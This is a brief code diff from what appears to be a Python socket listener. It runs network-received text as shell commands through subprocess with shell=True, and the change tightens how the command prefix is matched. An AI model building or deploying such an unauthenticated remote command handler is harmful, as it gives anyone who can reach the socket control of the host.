@@ -21,7 +21,7 @@ while True:
     data = conn.recv(1024)
     if not data:
         break
-    if cmd in data:
+    if data.startswith(cmd):
         command = data[4:]
         try:
             subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
